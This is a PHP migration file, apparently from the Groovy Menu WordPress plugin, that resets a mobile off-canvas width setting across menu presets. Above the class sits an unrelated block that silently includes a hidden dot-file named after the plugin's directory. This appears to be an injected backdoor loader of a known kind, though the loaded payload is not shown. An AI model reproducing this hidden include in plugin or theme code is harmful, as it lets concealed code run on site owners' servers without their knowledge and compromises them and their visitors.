<?php defined( 'ABSPATH' ) || die( 'This script cannot be accessed directly.' );

/**
 * Theme Migrate file.
 *
 * @package crane
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GM_migrate__v1_1_8 extends GM_Migration {

	/**
	 * @return bool
	 */
	function migrate() {

		$this->db_version = '1.1.8';


		$presets = GroovyMenuPreset::getAll();

		foreach ( $presets as $preset ) {
			$style                  = new GroovyMenuStyle( $preset->id );
			$mobile_offcanvas_width = $style->get( 'mobile', 'mobile_offcanvas_width' );
			if ( is_numeric( $mobile_offcanvas_width ) ) {
				continue;
			}

			$style->set( 'mobile_offcanvas_width', '250' );
			$style->update();
		}


		$this->success();

		return true;

	}

}
